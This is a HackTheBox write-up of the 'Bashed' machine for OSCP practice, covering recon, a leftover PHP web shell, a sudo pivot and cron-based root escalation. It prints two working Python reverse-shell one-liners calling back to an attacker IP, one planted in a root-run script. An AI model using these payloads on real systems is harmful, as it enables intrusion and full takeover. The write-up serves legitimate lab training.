+++
date = '2026-04-21T00:00:00-03:00'
draft = false
title = 'HTB: Bashed - OSCP Prep Write-up'
tags = ['htb', 'oscp', 'lain-kusanagi', 'write-up', 'linux', 'web', 'php', 'cron', 'sudo']
description = 'Write-up for the HackTheBox machine Bashed - a PHP web shell left on the server, sudo misconfiguration to pivot users, and a root-run job to escalate.'
ShowToc = true
TocOpen = false
[cover]
image = 'images/htb-bashed/cover.png'
+++

Bashed is a good reminder that developers are the best pentesters' allies - a web shell left in /dev does most of the work for you, and the path to root runs through a misconfigured sudo and a predictable job.

## Machine info

| | |
|---|---|
| **Name** | Bashed |
| **Platform** | HackTheBox |
| **OS** | Linux |
| **Difficulty** | Easy |

## TL;DR

- FeroxBuster finds a `/dev` directory hosting `phpbash.php` - an interactive PHP web shell
- Shell as `www-data`, `sudo -l` reveals we can run anything as `scriptmanager` without a password
- A job runs `/scripts/test.py` as root - overwrite it with a reverse shell payload to escalate

---

## Recon

### Nmap

```bash
nmap -sV -sC -Pn -A 10.129.0.0
```

![Nmap results](/images/htb-bashed/nmap.png)

Only port **80** (HTTP) is open.

![FeroxBuster results](/images/htb-bashed/feroxbuster.png)
---

## Enumeration

### Directory brute force



```bash
feroxbuster -u http://10.129.0.0 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```
FeroxBuster found a `/dev` directory - a directory listing. It reveals `phpbash.php` - a PHP web shell left on the server during development.

![/dev directory](/images/htb-bashed/dev-directory.png)
![phpbash web shell](/images/htb-bashed/phpbash.png)


---

## Foothold

### phpbash web shell

Clicking `phpbash.php` opens an interactive shell running as `www-data`. We can run commands directly from the browser.

![phpbash commands](/images/htb-bashed/phpbash-commands.png)

### Python reverse shell

For a more stable shell, I sent a Python reverse shell from phpbash:

```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.208",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```

![Reverse shell caught](/images/htb-bashed/reverse-shell.png)




---

## Privilege Escalation

### Lateral move to scriptmanager

Checking sudo permissions with `sudo -l` reveals we can run any command as `scriptmanager` without a password:

![Shell as www-data](/images/htb-bashed/shell-wwwdata.png)

I then used `sudo -u script manager /bin/bash` to start a shell as script manager.

![Shell as scriptmanager](/images/htb-bashed/sudo-scriptmanager.png)

### Job writing as root

There is a `/scripts` folder at the root of the filesystem, owned by `scriptmanager`:

![/scripts directory](/images/htb-bashed/scripts-directory.png)

Inside: `test.py` and `test.txt`. The `.txt` file is owned by **root** but written by the `.py` script - meaning root is executing `test.py` on a scheduled job.

![test.py content](/images/htb-bashed/test-py.png)

Since we own `test.py` as `scriptmanager`, we overwrite it with a reverse shell payload:

```bash
echo "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.10.14.208',4443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn('/bin/bash')" > test.py
```

Set up a listener and wait for cron to fire:

![Root shell](/images/htb-bashed/root-shell.png)

**Root!**

---

## Takeaways (for OSCP)

- **Development artifacts left in production are gold.** A PHP web shell in `/dev` is an extreme example, but leftover scripts, debug endpoints, and test pages are common in real assessments.
- **Always check `sudo -l` before anything else.** Sudo misconfigurations are one of the most common privesc paths on Linux and require zero exploit code.
- **Look for cron jobs touching writable files.** If a root-owned process writes to a file you can read, check who owns the script generating it. If writable, you control root's next execution.

## References

- [HackTheBox - Bashed](https://app.hackthebox.com/machines/Bashed)
- Lain Kusanagi list (OSCP prep)
